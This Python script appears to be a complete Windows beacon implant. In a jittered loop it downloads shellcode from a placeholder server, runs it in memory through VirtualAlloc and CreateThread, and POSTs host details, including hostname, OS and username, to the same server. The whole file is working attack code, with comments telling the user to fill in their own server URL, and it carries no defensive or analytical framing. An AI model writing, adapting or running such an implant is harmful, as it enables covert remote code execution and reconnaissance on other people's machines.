import urllib.request  # Module for handling URL requests
import ctypes          # Module for interfacing with C data types
import platform        # Module for accessing system information
import os              # Module for interacting with the operating system
import time            # Module for time-related functions
import random          # Module for generating random numbers
import uuid            # Module for generating UUIDs
import json            # Module for handling JSON data

# URLs for fetching shellcode and sending metadata
shellcode_url = "http://your-server.com/shellcode.bin"  # Update with your URL
metadata_url = "http://your-server.com/metadata"        # Update with your URL

# Jitter parameters to randomize polling intervals
polling_interval_min = 60   # Minimum interval in seconds
polling_interval_max = 300  # Maximum interval in seconds

def download_shellcode(url):
    """
    Downloads shellcode from the provided URL.

    :param url: String URL to fetch shellcode from
    :return: Bytes of shellcode if successful, None otherwise
    """
    try:
        with urllib.request.urlopen(url) as response:
            return response.read()  # Reads content as bytes
    except Exception as e:
        print(f'Failed to download shellcode: {e}')
        return None  # Returns None if there's an error

def execute_shellcode(shellcode):
    """
    Executes the provided shellcode in memory using VirtualAlloc and CreateThread.

    :param shellcode: Bytes of shellcode to execute
    """
    kernel32 = ctypes.windll.kernel32  # Access to Windows kernel32.dll
    shellcode_size = len(shellcode)   # Determine size of shellcode in bytes

    # Allocate memory in the process's address space
    ptr = kernel32.VirtualAlloc(
        None,                       # Let the system decide the base address
        shellcode_size,             # Size of allocation in bytes
        0x3000,                     # MEM_COMMIT | MEM_RESERVE
        0x40                        # PAGE_EXECUTE_READWRITE
    )

    # Copy shellcode into the allocated memory
    buf = (ctypes.c_char * shellcode_size).from_buffer_copy(shellcode)
    ctypes.memmove(ptr, buf, shellcode_size)

    # Create a thread to execute the shellcode
    thread_id = ctypes.c_ulong(0)   # Placeholder for thread ID
    if not kernel32.CreateThread(
        None,                       # Default security descriptor
        0,                          # Default stack size
        ctypes.c_void_p(ptr),       # Start address of thread
        None,                       # No arguments to pass
        0,                          # Run immediately
        ctypes.byref(thread_id)     # Pointer to store thread ID
    ):
        raise ctypes.WinError()     # Raise exception if thread creation fails

    # Wait indefinitely for the thread to finish executing
    kernel32.WaitForSingleObject(ctypes.c_void_p(thread_id), -1)

def send_metadata(url, metadata):
    """
    Sends metadata to the provided URL using a JSON-encoded POST request.

    :param url: String URL to send metadata to
    :param metadata: Dictionary of metadata to send
    """
    try:
        # Prepare the request with JSON-encoded metadata
        req = urllib.request.Request(
            url,
            data=json.dumps(metadata).encode('utf-8'),  # Encode metadata as JSON
            headers={'Content-Type': 'application/json'}  # Specify JSON content type
        )
        urllib.request.urlopen(req)  # Execute the POST request
    except Exception as e:
        print(f"Failed to send metadata: {e}")  # Handle errors if request fails

def get_metadata():
    """
    Collects basic metadata about the host system.

    :return: Dictionary containing metadata
    """
    return {
        "hostname": platform.node(),               # Get hostname of the system
        "os": platform.system(),                   # Get operating system name
        "os_version": platform.version(),          # Get OS version information
        "architecture": platform.machine(),        # Get system architecture
        "processor": platform.processor(),         # Get processor information
        "user": os.getlogin(),                     # Get current username
        "uuid": str(uuid.uuid4())                  # Generate and get a UUID
    }

def main():
    """
    Main loop that fetches and executes shellcode, sends metadata, and waits with jitter.
    """
    while True:
        shellcode = download_shellcode(shellcode_url)  # Fetch the shellcode
        if shellcode:
            execute_shellcode(shellcode)  # Execute if shellcode download is successful

        metadata = get_metadata()  # Collect system metadata
        send_metadata(metadata_url, metadata)  # Send the metadata

        # Randomly determine sleep time within specified range
        sleep_time = random.randint(polling_interval_min, polling_interval_max)
        time.sleep(sleep_time)  # Sleep for determined interval

if __name__ == "__main__":
    main()  # Run the main loop
